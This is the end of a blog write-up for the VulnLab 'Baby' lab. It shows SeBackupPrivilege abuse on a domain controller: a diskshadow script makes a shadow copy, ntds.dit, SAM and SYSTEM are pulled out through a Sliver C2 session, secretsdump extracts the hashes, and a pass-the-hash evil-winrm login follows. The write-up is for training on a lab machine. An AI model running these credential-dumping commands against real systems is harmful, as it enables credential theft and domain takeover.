</code></pre><p>And I noticed that we have the <code>SeBackupPrivilege</code> and <code>SeRestorePrivilege</code> privilege enabled, that automatically means that we can abuse those to get the <code>ntds.dit,SAM,SYSTEM</code> files to obtain some hashes that we can use further to escalate our privileges.</p><p>There are a lot of resources for this technique, here are some of my favorite reads:</p><ul><li><a href=https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960>https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960</a></li><li><a href=https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup>https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup</a></li><li><a href=https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/>https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/</a></li></ul><p>I created a file on my local system called <code>syl.dsh</code> which is basically a script file that can execute series of commands, the contents is as follows:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl><span class=k>set</span> <span class=nv>context persistent nowriters</span>
</span></span><span class=line><span class=cl>add volume c: alias syl
</span></span><span class=line><span class=cl>create
</span></span><span class=line><span class=cl>expose <span class=nv>%syl%</span> z:
</span></span></code></pre></div><p>This sets the context to be persistent, so that the shadow copies will be kept after the <code>diskshadow</code> session is closed. Then we add a shadowcopy of the C:\ drive with the alias <code>syl</code>, we create it and we expose it as another drive <code>Z:</code></p><p>Then we can download the shadow copy of the <code>ntds</code> file using the SilverC2&rsquo;s interactive mode.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>server<span class=o>]</span> sliver <span class=o>(</span>EXISTING_CROTCH<span class=o>)</span> &gt; download Z:<span class=se>\W</span>indows<span class=se>\n</span>tds
</span></span></code></pre></div><p>And we also need the SYSTEM and SAM files, which we can get by invoking the <code>reg</code> utility.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>server<span class=o>]</span> sliver <span class=o>(</span>EXISTING_CROTCH<span class=o>)</span> &gt; reg save hklm<span class=se>\s</span>am c:<span class=se>\T</span>emp<span class=se>\s</span>am
</span></span><span class=line><span class=cl><span class=o>[</span>server<span class=o>]</span> sliver <span class=o>(</span>EXISTING_CROTCH<span class=o>)</span> &gt; reg save hklm<span class=se>\s</span>ystem c:<span class=se>\T</span>emp<span class=se>\s</span>ystem
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl><span class=o>[</span>server<span class=o>]</span> sliver <span class=o>(</span>EXISTING_CROTCH<span class=o>)</span> &gt; download system
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Wrote <span class=m>16842752</span> bytes <span class=o>(</span><span class=m>1</span> file successfully, <span class=m>0</span> files unsuccessfully<span class=o>)</span> to /home/syl/vulnlab/Baby/system
</span></span><span class=line><span class=cl><span class=o>[</span>server<span class=o>]</span> sliver <span class=o>(</span>EXISTING_CROTCH<span class=o>)</span> &gt; download SAM
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Wrote <span class=m>16842752</span> bytes <span class=o>(</span><span class=m>1</span> file successfully, <span class=m>0</span> files unsuccessfully<span class=o>)</span> to /home/syl/vulnlab/Baby/SAM
</span></span></code></pre></div><p>Now we can extract the hashes with <code>impacket-secretsdump</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ python3 secretsdump.py -system /home/syl/vulnlab/Baby/exfiltrated/system -sam /home/syl/vulnlab/Baby/exfiltrated/SAM -ntds /home/syl/vulnlab/Baby/exfiltrated/ntds.dit LOCAL
</span></span><span class=line><span class=cl>...
</span></span><span class=line><span class=cl>Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;HASH&gt;:::
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>And once we&rsquo;ve extracted the hash, we can log in to the DC using WinRM.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sylsec$ evil-winrm -i <span class=nv>$ip</span> -u Administrator -H <span class=nv>$hash</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; <span class=nb>cd</span> ..<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; <span class=nb>type</span> root.txt
</span></span><span class=line><span class=cl>VL<span class=o>{</span>&lt;hash&gt;<span class=o>}</span>
</span></span></code></pre></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://sy1.sh/tags/vulnlab/>vulnlab</a></li></ul><nav class=paginav><a class=next href=https://sy1.sh/writeups/htb-ambassador/><span class=title>Next »</span><br><span>Hack The Box - Ambassador [Medium]</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://sy1.sh>0x73796C31</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod (sy1 modified)</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>